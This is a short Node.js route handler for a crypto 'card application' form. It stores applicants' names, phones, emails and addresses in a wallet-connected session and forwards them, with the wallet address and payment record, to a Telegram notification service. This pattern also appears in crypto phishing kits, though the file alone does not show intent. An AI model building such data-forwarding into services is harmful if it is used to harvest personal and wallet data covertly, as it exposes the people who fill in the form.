const store = require("../storage/sessions");
const { publicSession, createId } = require("../utils/helpers");
const { NotFoundError } = require("../utils/errors");
const logger = require("../utils/logger");

/**
 * POST /api/front/contact
 */
function submitContact(req, res) {
    const session = store.getSession(req.body.connectionId);

    if (!session) {
        throw new NotFoundError("Session not found");
    }

    const applicationId = createId();
    const contact = {
        applicationId,
        name: req.body.name,
        phone: req.body.phone,
        email: req.body.email,
        addressLine1: req.body.addressLine1,
        addressLine2: req.body.addressLine2 || "",
        zip: req.body.zip,
        state: req.body.state,
        country: req.body.country,
        submittedAt: new Date().toISOString()
    };

    const stored = store.updateSession(session.connectionId, { contact });

    const paymentStore = require("../storage/payments");
    const payment = paymentStore.getLatestByConnectionId(stored.connectionId);
    const walletAddress = (payment && stored.accounts?.find((item) => item.chainId === payment.chainId)?.address)
        || stored.wallet?.address
        || stored.accounts?.[0]?.address
        || null;
    const network = payment?.network || stored.accounts?.[0]?.chainId || stored.wallet?.chainId || null;

    try {
        const { notifyCardApplication } = require("../services/telegramNotifications");
        notifyCardApplication({
            applicationId,
            name: contact.name,
            phone: contact.phone,
            email: contact.email,
            addressLine1: contact.addressLine1,
            addressLine2: contact.addressLine2,
            zip: contact.zip,
            state: contact.state,
            country: contact.country,
            submittedAt: contact.submittedAt,
            walletAddress,
            network,
            connectionId: stored.connectionId,
            payment
        }).catch((err) => {
            logger.warn({ err: { message: err.message }, applicationId }, "Telegram card-application notification failed");
        });
    } catch (err) {
        logger.warn({ err: { message: err.message } }, "Telegram card-application notification failed");
    }

    res.json({
        success: true,
        applicationId,
        session: publicSession(stored)
    });
}

module.exports = {
    submitContact
};
